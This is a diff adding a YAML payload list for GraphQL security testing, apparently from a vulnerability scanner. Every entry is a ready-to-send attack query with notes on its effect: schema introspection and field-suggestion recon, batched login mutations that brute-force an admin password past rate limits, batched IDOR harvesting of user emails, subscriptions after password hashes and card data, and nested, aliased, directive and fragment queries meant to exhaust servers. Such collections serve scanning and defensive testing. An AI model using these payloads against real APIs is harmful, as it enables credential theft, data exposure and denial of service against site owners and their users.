@@ -1,0 +1,238 @@
+defaults:
+  vuln_type: graphql
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # Introspection — full schema enumeration
+  # ============================================================
+  - technique: introspection
+    injection_surface: graphql_query
+    evidence_type: content_match
+    risk: 1
+    payload: "{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}"
+    notes: "Full introspection query. Returns all types, fields, and nested type info. Exposes entire API surface."
+    tags: [introspection, schema, enumeration, recon]
+
+  - technique: introspection
+    injection_surface: graphql_query
+    evidence_type: content_match
+    risk: 1
+    payload: "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{name kind description fields(includeDeprecated:true){name description args{name type{name kind ofType{name kind}}}}enumValues(includeDeprecated:true){name}inputFields{name type{name kind ofType{name kind}}}possibleTypes{name}}}}"
+    notes: "Comprehensive introspection query covering query/mutation/subscription root types, deprecated fields, enum values, input fields, and union/interface possible types."
+    tags: [introspection, schema, full, enumeration, recon]
+
+  - technique: introspection
+    injection_surface: graphql_query
+    evidence_type: content_match
+    risk: 1
+    payload: "{__schema{directives{name description locations args{name type{name kind ofType{name kind}}}}}}"
+    notes: "Introspection of custom directives. Reveals server-side logic hints such as @auth, @deprecated, @cacheControl."
+    tags: [introspection, directives, recon]
+
+  # ============================================================
+  # Introspection — partial / targeted type queries
+  # ============================================================
+  - technique: introspection
+    injection_surface: graphql_query
+    evidence_type: content_match
+    risk: 1
+    payload: "{__type(name:\"User\"){name fields{name type{name kind ofType{name}}}}}"
+    notes: "Targeted __type query for User type. Enumerates fields like email, password, role without full schema dump."
+    tags: [introspection, type, user, recon]
+
+  - technique: introspection
+    injection_surface: graphql_query
+    evidence_type: content_match
+    risk: 1
+    payload: "{__type(name:\"Mutation\"){name fields{name args{name type{name kind ofType{name}}}}}}"
+    notes: "Introspect the Mutation root type. Lists all available mutations and their argument signatures."
+    tags: [introspection, mutation, enumeration, recon]
+
+  # ============================================================
+  # Introspection — __typename probe
+  # ============================================================
+  - technique: introspection
+    injection_surface: graphql_query
+    evidence_type: content_match
+    risk: 1
+    payload: "{__typename}"
+    notes: "Minimal __typename probe. Confirms endpoint is GraphQL if it returns Query/Mutation. Works even when introspection is disabled."
+    tags: [introspection, typename, probe, fingerprint]
+
+  # ============================================================
+  # Field suggestion exploitation
+  # ============================================================
+  - technique: field_suggestion
+    injection_surface: graphql_query
+    evidence_type: error
+    risk: 1
+    payload: "{usre{id}}"
+    notes: "Intentional typo 'usre' to trigger field suggestion. Server may respond with 'Did you mean user?' leaking valid field names even with introspection disabled."
+    tags: [field_suggestion, typo, enumeration, recon]
+
+  - technique: field_suggestion
+    injection_surface: graphql_query
+    evidence_type: error
+    risk: 1
+    payload: "{passwor}"
+    notes: "Typo probe for password-related fields. May trigger suggestions like 'password', 'passwordHash', 'passwordReset'."
+    tags: [field_suggestion, typo, password, recon]
+
+  - technique: field_suggestion
+    injection_surface: graphql_query
+    evidence_type: error
+    risk: 1
+    payload: "{admi{id}}"
+    notes: "Typo probe targeting admin-related types. May reveal 'admin', 'adminUser', 'adminSettings' via suggestions."
+    tags: [field_suggestion, typo, admin, recon]
+
+  # ============================================================
+  # Batched query arrays — mutation abuse
+  # ============================================================
+  - technique: batch_query
+    injection_surface: graphql_query
+    evidence_type: content_match
+    risk: 2
+    payload: "[{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"password1\\\"){token}}\"},{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"password2\\\"){token}}\"},{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"password3\\\"){token}}\"},{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"password4\\\"){token}}\"},{\"query\":\"mutation{login(username:\\\"admin\\\",password:\\\"password5\\\"){token}}\"}]"
+    notes: "Batched login mutations for credential brute-force. Sends 5 password attempts in a single HTTP request, bypassing per-request rate limiting."
+    tags: [batch, mutation, brute_force, auth, rate_limit_bypass]
+
+  - technique: batch_query
+    injection_surface: graphql_query
+    evidence_type: content_match
+    risk: 2
+    payload: "[{\"query\":\"{user(id:1){email}}\"},{\"query\":\"{user(id:2){email}}\"},{\"query\":\"{user(id:3){email}}\"},{\"query\":\"{user(id:4){email}}\"},{\"query\":\"{user(id:5){email}}\"},{\"query\":\"{user(id:6){email}}\"},{\"query\":\"{user(id:7){email}}\"},{\"query\":\"{user(id:8){email}}\"},{\"query\":\"{user(id:9){email}}\"},{\"query\":\"{user(id:10){email}}\"}]"
+    notes: "Batched IDOR enumeration. Fetches 10 user emails in a single request. Bypasses per-request rate limits and may evade WAF."
+    tags: [batch, idor, enumeration, rate_limit_bypass]
+
+  # ============================================================
+  # Deeply nested queries — depth-based DoS
+  # ============================================================
+  - technique: nested_query_dos
+    injection_surface: graphql_query
+    evidence_type: timing
+    risk: 3
+    payload: "{user(id:1){friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{name}}}}}}}}}}}}"
+    notes: "Depth 11 nested query on a self-referential relationship. Causes exponential resolver execution if no depth limit is enforced."
+    tags: [dos, depth, nested, resource_exhaustion]
+
+  - technique: nested_query_dos
+    injection_surface: graphql_query
+    evidence_type: timing
+    risk: 3
+    payload: "{thread(id:1){comments{replies{replies{replies{replies{replies{replies{replies{replies{replies{replies{body}}}}}}}}}}}}}}"
+    notes: "Depth 12 nested query on threaded comments. Common in forum/discussion APIs with recursive reply structures."
+    tags: [dos, depth, nested, comments, resource_exhaustion]
+
+  - technique: nested_query_dos
+    injection_surface: graphql_query
+    evidence_type: timing
+    risk: 3
+    payload: "{organization(id:1){members{organization{members{organization{members{organization{members{organization{members{organization{members{name}}}}}}}}}}}}}}"
+    notes: "Depth 12 nested query oscillating between organization and members. Exploits circular references in org/member graphs."
+    tags: [dos, depth, nested, circular, resource_exhaustion]
+
+  # ============================================================
+  # Alias-based amplification DoS
+  # ============================================================
+  - technique: alias_dos
+    injection_surface: graphql_query
+    evidence_type: timing
+    risk: 3
+    payload: "{a0:user(id:1){email}a1:user(id:1){email}a2:user(id:1){email}a3:user(id:1){email}a4:user(id:1){email}a5:user(id:1){email}a6:user(id:1){email}a7:user(id:1){email}a8:user(id:1){email}a9:user(id:1){email}a10:user(id:1){email}a11:user(id:1){email}a12:user(id:1){email}a13:user(id:1){email}a14:user(id:1){email}a15:user(id:1){email}a16:user(id:1){email}a17:user(id:1){email}a18:user(id:1){email}a19:user(id:1){email}a20:user(id:1){email}a21:user(id:1){email}a22:user(id:1){email}a23:user(id:1){email}a24:user(id:1){email}a25:user(id:1){email}a26:user(id:1){email}a27:user(id:1){email}a28:user(id:1){email}a29:user(id:1){email}a30:user(id:1){email}a31:user(id:1){email}a32:user(id:1){email}a33:user(id:1){email}a34:user(id:1){email}a35:user(id:1){email}a36:user(id:1){email}a37:user(id:1){email}a38:user(id:1){email}a39:user(id:1){email}a40:user(id:1){email}a41:user(id:1){email}a42:user(id:1){email}a43:user(id:1){email}a44:user(id:1){email}a45:user(id:1){email}a46:user(id:1){email}a47:user(id:1){email}a48:user(id:1){email}a49:user(id:1){email}a50:user(id:1){email}a51:user(id:1){email}a52:user(id:1){email}a53:user(id:1){email}a54:user(id:1){email}a55:user(id:1){email}a56:user(id:1){email}a57:user(id:1){email}a58:user(id:1){email}a59:user(id:1){email}a60:user(id:1){email}a61:user(id:1){email}a62:user(id:1){email}a63:user(id:1){email}a64:user(id:1){email}a65:user(id:1){email}a66:user(id:1){email}a67:user(id:1){email}a68:user(id:1){email}a69:user(id:1){email}a70:user(id:1){email}a71:user(id:1){email}a72:user(id:1){email}a73:user(id:1){email}a74:user(id:1){email}a75:user(id:1){email}a76:user(id:1){email}a77:user(id:1){email}a78:user(id:1){email}a79:user(id:1){email}a80:user(id:1){email}a81:user(id:1){email}a82:user(id:1){email}a83:user(id:1){email}a84:user(id:1){email}a85:user(id:1){email}a86:user(id:1){email}a87:user(id:1){email}a88:user(id:1){email}a89:user(id:1){email}a90:user(id:1){email}a91:user(id:1){email}a92:user(id:1){email}a93:user(id:1){email}a94:user(id:1){email}a95:user(id:1){email}a96:user(id:1){email}a97:user(id:1){email}a98:user(id:1){email}a99:user(id:1){email}}"
+    notes: "100 aliased queries for the same field in a single request. Each alias triggers a separate resolver call, amplifying server load 100x."
+    tags: [dos, alias, amplification, resource_exhaustion]
+
+  - technique: alias_dos
+    injection_surface: graphql_query
+    evidence_type: timing
+    risk: 3
+    payload: "{a0:expensiveSearch(query:\"test\"){results{title}}a1:expensiveSearch(query:\"test\"){results{title}}a2:expensiveSearch(query:\"test\"){results{title}}a3:expensiveSearch(query:\"test\"){results{title}}a4:expensiveSearch(query:\"test\"){results{title}}a5:expensiveSearch(query:\"test\"){results{title}}a6:expensiveSearch(query:\"test\"){results{title}}a7:expensiveSearch(query:\"test\"){results{title}}a8:expensiveSearch(query:\"test\"){results{title}}a9:expensiveSearch(query:\"test\"){results{title}}a10:expensiveSearch(query:\"test\"){results{title}}a11:expensiveSearch(query:\"test\"){results{title}}a12:expensiveSearch(query:\"test\"){results{title}}a13:expensiveSearch(query:\"test\"){results{title}}a14:expensiveSearch(query:\"test\"){results{title}}a15:expensiveSearch(query:\"test\"){results{title}}a16:expensiveSearch(query:\"test\"){results{title}}a17:expensiveSearch(query:\"test\"){results{title}}a18:expensiveSearch(query:\"test\"){results{title}}a19:expensiveSearch(query:\"test\"){results{title}}}"
+    notes: "20 aliased calls to a computationally expensive search resolver. Amplifies cost when the resolver performs DB full-text search or external API calls."
+    tags: [dos, alias, amplification, search, resource_exhaustion]
+
+  # ============================================================
+  # Directive overloading
+  # ============================================================
+  - technique: nested_query_dos
+    injection_surface: graphql_query
+    evidence_type: timing
+    risk: 2
+    payload: "{user(id:1){name @aa @ab @ac @ad @ae @af @ag @ah @ai @aj @ak @al @am @an @ao @ap @aq @ar @as @at @au @av @aw @ax @ay @az @ba @bb @bc @bd @be @bf @bg @bh @bi @bj @bk @bl @bm @bn @bo @bp @bq @br @bs @bt @bu @bv @bw @bx}}"
+    notes: "50 directives on a single field. Some GraphQL implementations process each directive sequentially, causing CPU exhaustion or stack overflow."
+    tags: [dos, directive, overload, resource_exhaustion]
+
+  - technique: nested_query_dos
+    injection_surface: graphql_query
+    evidence_type: error
+    risk: 2
+    payload: "query @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) {user(id:1){name}}"
+    notes: "Duplicate built-in @skip directives on the operation. Tests if the server validates or limits repeated directives."
+    tags: [dos, directive, skip, duplicate, probe]
+
+  # ============================================================
+  # Fragment-based depth amplification
+  # ============================================================
+  - technique: nested_query_dos
+    injection_surface: graphql_query
+    evidence_type: timing
+    risk: 3
+    payload: "query{user(id:1){...F1}}fragment F1 on User{friends{...F2}}fragment F2 on User{friends{...F3}}fragment F3 on User{friends{...F4}}fragment F4 on User{friends{...F5}}fragment F5 on User{friends{...F6}}fragment F6 on User{friends{...F7}}fragment F7 on User{friends{...F8}}fragment F8 on User{friends{...F9}}fragment F9 on User{friends{...F10}}fragment F10 on User{friends{name email}}"
+    notes: "10 chained named fragments creating depth 10+ query. Bypasses simple depth checks that only inspect the query AST without resolving fragment spreads."
+    tags: [dos, fragment, depth, bypass, resource_exhaustion]
+
+  - technique: nested_query_dos
+    injection_surface: graphql_query
+    evidence_type: timing
+    risk: 3
+    payload: "query{user(id:1){...on User{friends{...on User{friends{...on User{friends{...on User{friends{...on User{friends{...on User{friends{...on User{friends{...on User{friends{...on User{friends{...on User{friends{name}}}}}}}}}}}}}}}}}}}}}"
+    notes: "Inline fragment depth amplification. Uses ...on User inline fragments to nest 10 levels deep. May bypass named-fragment-only depth analysis."
+    tags: [dos, fragment, inline, depth, bypass, resource_exhaustion]
+
+  # ============================================================
+  # Subscription abuse
+  # ============================================================
+  - technique: nested_query_dos
+    injection_surface: graphql_query
+    evidence_type: content_match
+    risk: 2
+    payload: "subscription{onUserCreated{id email passwordHash role}}"
+    notes: "Subscribe to user creation events requesting sensitive fields. If subscription auth is weaker than query auth, may leak new user data in real-time."
+    tags: [subscription, sensitive_data, auth_bypass, recon]
+
+  - technique: nested_query_dos
+    injection_surface: graphql_query
+    evidence_type: content_match
+    risk: 2
+    payload: "subscription{onOrderPlaced{id total customer{email creditCard{last4}}}}"
+    notes: "Subscribe to order events requesting nested PII. Tests whether subscription resolvers enforce field-level authorization."
+    tags: [subscription, pii, auth_bypass, idor]
+
+  # ============================================================
+  # Query complexity bypass
+  # ============================================================
+  - technique: nested_query_dos
+    injection_surface: graphql_query
+    evidence_type: content_match
+    risk: 2
+    payload: "{users(first:10000){edges{node{id email posts(first:10000){edges{node{title comments(first:10000){edges{node{body}}}}}}}}}}}"
+    notes: "Pagination abuse with maximum first argument at every level. Bypasses depth limits by staying shallow while requesting enormous result sets."
+    tags: [dos, pagination, complexity, resource_exhaustion]
+
+  - technique: nested_query_dos
+    injection_surface: graphql_query
+    evidence_type: timing
+    risk: 3
+    payload: "query{search(query:\"*\"){...on User{id email friends(first:1000){name}}...on Post{id title comments(first:1000){body}}...on File{id url size}}}"
+    notes: "Union type fan-out with inline fragments. Forces the resolver to execute across multiple backing services and return large result sets from each type."
+    tags: [dos, union, complexity, fan_out, resource_exhaustion]
+
+  - technique: alias_dos
+    injection_surface: graphql_query
+    evidence_type: timing
+    risk: 2
+    payload: "{a0:__typename a1:__typename a2:__typename a3:__typename a4:__typename a5:__typename a6:__typename a7:__typename a8:__typename a9:__typename a10:__typename a11:__typename a12:__typename a13:__typename a14:__typename a15:__typename a16:__typename a17:__typename a18:__typename a19:__typename a20:__typename a21:__typename a22:__typename a23:__typename a24:__typename a25:__typename a26:__typename a27:__typename a28:__typename a29:__typename a30:__typename a31:__typename a32:__typename a33:__typename a34:__typename a35:__typename a36:__typename a37:__typename a38:__typename a39:__typename a40:__typename a41:__typename a42:__typename a43:__typename a44:__typename a45:__typename a46:__typename a47:__typename a48:__typename a49:__typename}"
+    notes: "50 aliased __typename queries. Low-cost per-alias probe to test if the server enforces alias count limits before escalating to expensive resolvers."
+    tags: [alias, probe, typename, complexity, recon]
